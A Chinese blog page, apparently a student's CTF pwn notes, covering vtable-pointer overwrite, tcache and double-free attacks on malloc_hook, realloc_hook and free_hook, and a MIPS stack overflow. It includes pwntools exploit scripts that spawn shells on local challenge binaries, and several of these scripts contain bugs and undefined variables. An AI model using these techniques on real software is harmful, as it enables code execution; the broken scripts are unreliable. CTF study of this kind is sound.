@@ -1,0 +1,602 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>虚函数与 malloc_hook 利用 | 良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>虚函数与 malloc_hook 利用</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/7/25
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #ff7d73">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/heap/" style="color: #00a596">
+                    heap
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/vtable/" style="color: #ff7d73">
+                    vtable
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/malloc-hook/" style="color: #ffa2c4">
+                    malloc_hook
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="garden"><a href="#garden" class="headerlink" title="garden"></a>garden</h1><p>虚函数。虚函数在开头有个指针列表，用来维护虚函数的指针</p>
+<p>虚表指针对应类的虚函数表地址</p>
+<p>通过基类调用虚函数时，对象的虚表指针找到对应的虚函数表。调用表内的相应地址，实现动态绑定。</p>
+<p>纯虚函数是在基类里面定义但没有实现的类。</p>
+<p>没有实现的类的主要作用是作为接口的定义，强制派生类必须实现纯虚函数。</p>
+<p>c＋＋里有虚函数，c语言里有类似的定义和实现，好像也是为了实现和c＋＋里虚函数一样的功能</p>
+<p>main函数。中间的listen是用来调用虚函数的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064610-4308d5d3-b338-46ce-be5d-2a36cf283727.png"></p>
+<p>看一下remove。没有uaf，它做了处理。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064685-1a020891-b794-4caa-88e7-740d1f109266.png"></p>
+<p>一开始找不见漏洞。没有uaf，堆溢出也不知道溢出哪个</p>
+<p>Checksec 一下发现没有nx。方便写shellcode</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064690-3462c9a7-3cbb-46bc-94f8-676b3826d346.png"></p>
+<p>看一看别的部分</p>
+<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/DLs2wG4YgiBdDZkISqMcx0cQn8g">Strcpy 是一个危险的函数</a>。</p>
+<p>看到这个std这，它使用了一个strcpy函数。可以进行堆溢出</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064737-2cc9dcdb-4add-4f32-baa7-387ef7cea763.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531064758-9b2c0628-caf7-4453-be64-b29ebfdeaf77.png"></p>
+<p>那就是用这个函数来一个堆溢出，然后覆盖掉。用虚表指针指向shellcode执行bin&#x2F;sh就行</p>
+<p>最后要调一下listen函数调用一下vptr指针。</p>
+<pre><code class="language-plain">from pwn import *
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+p=process(&quot;./garden&quot;)
+elf=ELF(&#39;./garden&#39;)
+
+shellcode = asm(&#39;&#39;&#39;
+    xor    rax, rax        
+    push   rax             
+    push   0x68732F2F      
+    push   0x6E69622F      
+    mov    rdi, rsp        
+    xor    rsi, rsi        
+    xor    rdx, rdx        
+    mov    al, 0x3B        
+    syscall                
+&#39;&#39;&#39;)
+
+def add(name,weight):
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(&quot;1&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(name)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(weight))
+    
+def remove(idx):
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(&quot;5&quot;)
+    p.recvuntil(&quot;:&quot;)
+    p.sendline(str(idx))
+    
+bss=0x605420
+p.recvuntil(&quot;:&quot;)
+p.sendline(b&#39;a&#39;*8+p64(name+8)+shellcode)
+
+add(b&#39;A&#39;*8,0)
+add(b&#39;B&#39;*8,1)
+    
+remove(0)
+
+fake_ptr=name+8
+add(b&#39;a&#39;*72+p64(fake_ptr),2)
+
+p.recvuntil(&quot;:&quot;)
+p.sendline(&quot;3&quot;)
+p.recvuntil(&quot;:&quot;)
+p.sendline(b&#39;0&#39;)
+
+p.interactive()
+</code></pre>
+<h1 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="realloc_hook"></a>realloc_hook</h1><p>realloc_hook 用free_hook写的。用realloc_hook的话libc泄露前面应该是一样的</p>
+<p>泄露libc之后的通过tcache_攻击让malloc指到realloc_hook-0x10这个地方的chunk</p>
+<p>继续把这个chunk改成system。最后有bin&#x2F;sh的chunk调用realloc。触发bin&#x2F;sh</p>
+<pre><code class="language-plain">realloc_hook = libc_base + libc.sym[&#39;__realloc_hook&#39;]
+system_addr  = libc_base + libc.sym[&#39;system&#39;]
+
+#tcache_realloc_hook
+delete(1)
+payload = b&#39;A&#39;*0x68 + p64(0x71) + p64(realloc_hook - 0x10)
+edit(0, 0x78, payload)
+add(3, 0x60)
+add(4, 0x60)
+
+edit(4, 0x8, p64(system_addr))
+
+add(5, 0x20)
+edit(5, 0x8, b&#39;/bin/sh\x00&#39;)
+choice(3)
+io.recvuntil(b&#39;Sanctum for arcane inscription:\n&#39;)
+io.sendline(b&#39;5&#39;)
+io.recvuntil(b&#39;Runic sequence length:\n&#39;)
+io.sendline(b&#39;0x30&#39;)  
+io.interactive()
+</code></pre>
+<h1 id="EZ3"><a href="#EZ3" class="headerlink" title="EZ3"></a>EZ3</h1><p>ida没有mips的编译，照着添加了之后只能在终端里输出。下了一个新的ghidra直接看</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531065255-36b2f3f9-c5a6-4a55-be1c-0f00304ad0a5.png"></p>
+<p>ida这个终端输出的不知道是什么。直接用ghidra看吧。main函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531065575-28a04e17-6336-4f6b-aa14-05380fe78d21.png"></p>
+<p>分析以后是栈溢出。有后门，用栈溢出的方法来做</p>
+<p>mips是一种新的汇编，要先学习一下对应的指令。</p>
+<p>看一下指令集<a target="_blank" rel="noopener" href="https://www.tarikvon.cn/2024/05/25/MIPS/">https://www.tarikvon.cn/2024/05/25/MIPS/</a></p>
+<pre><code class="language-plain">from pwn import *
+context(os = &#39;linux&#39;, arch = &#39;mips&#39;, log_level = &#39;debug&#39;)
+io = process([&quot;qemu-mipsel&quot;, &quot;-L&quot;, &quot;/usr/mipsel-linux-gnu&quot;, &quot;./EZ3.0&quot;])
+elf = ELF(&quot;./EZ3.0&quot;)
+
+binsh = 0x0411010
+lw = 0x00400a20
+system_addr = 0x00400B70 
+
+payload = b&#39;a&#39; * 36
+payload += p32(lw)
+payload += p32(0)
+payload += p32(system_addr)
+payload += p32(binsh_cat)
+io.sendafter(&quot;&gt;&quot;, payload)
+io.interactive()
+</code></pre>
+<h1 id="（七月第四周）"><a href="#（七月第四周）" class="headerlink" title="（七月第四周）"></a>（七月第四周）</h1><h1 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h1><p>看一下</p>
+<p>main函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101946-163e5d87-5f7b-41bd-bd45-691c0dcc6d17.png"></p>
+<p>欢迎，菜单函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101895-b9d977e6-196e-486f-8c32-0fad3a5d2e90.png"></p>
+<p>free函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101973-df7c30fb-7417-4d7c-bc68-508057e27192.png"></p>
+<p>add函数。好像只能最多加16个。大小是大于0x0小于0x128的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101903-a3a7b507-6dcc-423f-88be-b49dc8becc7e.png"></p>
+<p>有一个change_name函数。它可以往bss上读数据。可以读0xd0。可以打印对应的bss数据</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531101968-29d29a98-bcf8-44c2-b8b0-f18f8e857bf6.png"></p>
+<p>用change_name来打印libc。覆盖到malloc_hook。在这之前先把malloc函数改成bin&#x2F;sh或者onegadget。</p>
+<p>要泄露libc的话这是用的unsorted bin attarct。在bss上构造一个假的堆。感觉跟栈迁移有点像。</p>
+<p>劫持返回地址用double free。先来一次double free把地址改到bss。</p>
+<p>再在bss上伪造大堆，让它free掉进入unsorted bin 。再溢出假的堆。一直覆盖到跟main arana连的指针用change name函数打印出来libc</p>
+<p>之后就是再double free一遍。把地址改到hook这。用libc算一下onegadget的地址。hook改成onegadget的。发送数据调用hook就能执行onegadget了</p>
+<p>wp里面debug这一段不知道是干啥的</p>
+<pre><code class="language-plain">def dbg():
+    gdb.attach(io)
+io.recv()
+payload = p64(0) + p64(0x7F)
+payload = payload.ljust(0x70, b&quot;\x00&quot;)
+payload += p64(0x7F)
+io.sendline(payload)
+</code></pre>
+<pre><code class="language-plain">#假的堆的情况
+偏移 0x00: 0x0000000000000000  ← prev_size
+偏移 0x08: 0x0000000000000091  ← size (0x90字节 + prev_inuse标志)
+偏移 0x10-0x97: &quot;aaaa...&quot;      ← 填充数据
+偏移 0x98: 0x0000000000000021  ← 伪造的下一个chunk的size
+偏移 0xa0: 0x0000000000000000  ← 伪造的prev_size
+偏移 0xa8: 0x0000000000000000  ← 伪造的fd
+偏移 0xb0: 0x0000000000000000  ← 伪造的bk  
+偏移 0xb8: 0x0000000000000021  ← 再下一个chunk的size
+</code></pre>
+<pre><code class="language-plain">from pwn import *
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+io = process(&#39;./malloc&#39;)
+elf = ELF(&quot;./malloc&quot;)
+libc = ELF(&quot;libc.so.6&quot;)
+
+def dbg():
+    gdb.attach(io)
+#io.recv()
+#payload = p64(0) + p64(0x7F)
+#payload = payload.ljust(0x70, b&quot;\x00&quot;)
+#payload += p64(0x7F)
+#io.sendline(payload)
+
+def add(size, content):
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(1))
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(size))
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(content)
+def free(idx):
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(2))
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(idx))
+def change(con):
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline(str(3))
+    io.recvuntil(b&quot;&gt; &quot;)
+    io.sendline()
+    
+add(0x60, b&quot;a&quot;)  # 0
+add(0x60, b&quot;a&quot;)  # 1
+add(0x60, b&quot;a&quot;)  # 2
+free(0)
+free(1)
+free(0)
+add(0x60, p64(0x6020c0))  # 3
+add(0x60, b&quot;a&quot;)  # 4
+add(0x60, b&quot;a&quot;)  # 5
+add(0x60, b&quot;a&quot;)  # 6
+
+payload = p64(0) + p64(0x91)
+payload = payload.ljust(0x98, b&quot;a&quot;)
+payload += p64(0x21) + p64(0) * 3 + p64(0x21)
+change(payload)
+free(6)
+payload = b&quot;a&quot; * 0xF + p8(0x91)
+new(payload)
+libc.address = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - 0x3C4B78
+info(&quot;libc base: &quot; + hex(libc.address))
+change(p64(0) + p64(0x21))
+
+free(1)
+free(0)
+free(1)
+add(0x60, p64(libc.sym[&quot;malloc_hook&quot;] - 0x23))  # 7
+add(0x60, b&quot;a&quot;)
+add(0x60, b&quot;a&quot;)
+add(0x60, b&quot;a&quot; * 0x13 + p64(libc.address + 0xf03a4)
+
+io.recv()
+io.sendline(str(1))
+io.recvuntil(b&quot;&gt; &quot;)
+io.sendline(str(0x60))
+io.interactive()
+</code></pre>
+<h1 id="realloc-hook-1"><a href="#realloc-hook-1" class="headerlink" title="realloc_hook"></a>realloc_hook</h1><p>main函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102509-ad99d450-8e5c-4215-987e-b1f62473ceb3.png"></p>
+<p>add函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102544-db59ed7a-3ff2-40e5-aaf9-d9080fb4c63a.png"></p>
+<p>free 指针没有置空</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102567-71f9a4c6-8f9a-4c09-a3ac-a14a011d31d0.png"></p>
+<p>有edit函数。它返回的read可以溢出</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102733-3b9caac5-e549-461f-9f7c-7791a1d3a6e7.png"></p>
+<p>可以puts的函数</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531102703-70c5a6a8-ca2b-4794-bc1d-1b78e7a9bf1d.png"></p>
+<p>如果是高版本的glibc，可以tcache bin attack 直接覆盖掉指针。</p>
+<p>我们先uaf泄露libc，用unsorted bin 然后算出来libc的地址以后算system.因为有edit函数。我们就不用onegadget了。直接用edit把堆的内容改成system bin&#x2F;sh 然后执行就可以</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760531103085-4c4ab0ee-2c49-41b0-b88a-9e8e19bb6cfd.png"></p>
+<pre><code class="language-plain">from pwn import * 
+
+context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+io=process(&#39;./realloc&#39;)
+libc=ELF(&#39;./libc.so.6&#39;)
+
+
+def add(idx,size):
+    p.sendlineafter(&#39;Chant your choice:&#39;,b&#39;1&#39;)
+    p.sendlineafter(&#39;Celestial alignment coordinate:&#39;,str(idx))
+    p.sendlineafter(&#39;Quantum essence required:&#39;,str(size))
+def free(idx):
+    p.sendlineafter(&#39;Chant your choice:&#39;,b&#39;2&#39;)
+    p.sendlineafter(&#39;Cursed sanctum to cleanse:&#39;,str(idx))
+def edit(idx,size,content):
+    p.sendlineafter(&#39;Chant your choice:&#39;,b&#39;3&#39;)
+    p.sendlineafter(&#39;Sanctum for arcane inscription:&#39;,str(idx))
+    p.sendlineafter(&#39;Runic sequence length:&#39;,str(size))
+    p.sendafter(&#39;Inscribe your primordial truth:&#39;,content)
+def puts(idx):
+    p.sendlineafter(&#39;Chant your choice:&#39;,b&#39;4&#39;)
+    p.sendlineafter(&#39;Sanctum to reveal cosmic truth:&#39;,str(idx))
+    
+
+add(0,0x68)
+add(1,0x68)
+add(2,0x410)
+add(3,0x68)
+
+free(2)
+puts(2)
+
+main_arena = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))
+malloc_hook = main_arena-96-0x10
+libc_base = malloc_hook-libc.sym[&#39;__malloc_hook&#39;]
+fake = libc_base+libc.sym[&#39;__free_hook&#39;]
+system = libc_base+libc.sym[&#39;system&#39;]
+
+free(1)
+edit(1,0x100,p64(fake))
+add(1,0x68)
+add(4,0x68)
+edit(4,0x100,p64(system))
+edit(3,0x100,p64(&#39;/bin/sh\x00&#39;))
+free(3)
+p.interactive
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/ZLF2wqKQUi2OwNkUnWVc3bILnzc">main_arena与malloc的偏移</a></p>
+<p>伪造假的堆。</p>
+<pre><code class="language-plain">add(0,0x30)
+add(1,0x30)
+add(2,0x30)
+add(3,0x430)
+add(4,0x30)
+delete(4)
+delete(3)
+
+fake_chunk = p64(0)*7+p64(0x41)+p64(0)*7+p64(0x41)+p64(0)*7+p64(0x441)
+edit(0,0x40,fake_chunk)
+add(1,0x420)
+show(1)
+p.recv(8)
+main_arena=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))-96-1024
+print(hex(main_arena))
+libc_base=main_arena-0x3ebc40
+print(hex(libc_base))
+free_hook=libc_base+libc.symbols[&#39;__free_hook&#39;]
+print(hex(free_hook))
+system_addr=libc_base+libc.symbols[&#39;system&#39;]
+delete(1)
+delete(2)
+
+fake_chunk = p64(0)*7+p64(0x41)+p64(0)*7+p64(0x41)+p64(free_hook)
+edit(0,0x100,fake_chunk)
+</code></pre>
+<p>有的偏移还不是很清楚。上面这个假堆的0x3ebc40和减的1024是什么还不知道。在libc 文件里的malloc trim函数里也没找见</p>
+<h1 id="garden-1"><a href="#garden-1" class="headerlink" title="garden"></a>garden</h1>
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="ice993/hexo-123"
+    data-repo-id="R_kgDOPWL0Lg"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOPWL0Ls4Ct1k-"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
